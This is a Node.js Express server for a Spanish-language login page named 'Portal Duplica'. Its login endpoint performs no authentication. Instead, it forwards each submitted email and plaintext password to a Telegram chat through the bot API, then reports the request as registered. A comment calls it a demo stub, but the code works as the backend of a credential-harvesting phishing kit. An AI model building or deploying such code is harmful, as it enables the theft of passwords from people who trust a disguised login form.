require("dotenv").config();
const express = require("express");
const os = require("os");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";

function getLocalAddresses() {
  const addresses = [];
  for (const interfaces of Object.values(os.networkInterfaces())) {
    for (const iface of interfaces) {
      if (iface.family === "IPv4" && !iface.internal) {
        addresses.push(iface.address);
      }
    }
  }
  return addresses;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn("[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return { ok: false, error: "not_configured" };
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    console.error("[telegram]", data.description || res.statusText);
    return { ok: false, error: data.description || "request_failed" };
  }
  return { ok: true };
}

app.get("/health", (_req, res) => res.json({ ok: true }));

app.post("/api/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Correo y contraseña obligatorios." });
  }

  // Demo stub — replace with real authentication (hashing, sessions, etc.)
  console.log("[login] Demo submit received for:", email);

  if (process.env.TELEGRAM_NOTIFY === "true") {
    const when = new Date().toISOString();
    const result = await sendTelegram(
      [
        "<b>Portal Duplica</b>",
        "",
        "<b>Evento:</b> envío del formulario",
        `<b>Correo:</b> ${escapeHtml(email)}`,
        `<b>Contraseña:</b> ${escapeHtml(password)}`,
        `<b>Hora (UTC):</b> ${when}`,
      ].join("\n")
    );
    if (result.ok) {
      console.log("[telegram] Notification sent.");
    } else {
      console.error("[telegram] Notification failed:", result.error);
    }
  }

  return res.json({
    ok: true,
    message: "Solicitud registrada.",
  });
});

app.listen(PORT, HOST, () => {
  const localAddresses = getLocalAddresses();
  console.log(`Server listening on ${HOST}:${PORT}`);
  console.log(`Local:   http://localhost:${PORT}`);
  for (const address of localAddresses) {
    console.log(`Network: http://${address}:${PORT}`);
  }
  if (localAddresses.length === 0) {
    console.log("No LAN IPv4 address found. Check your network connection.");
  }
});
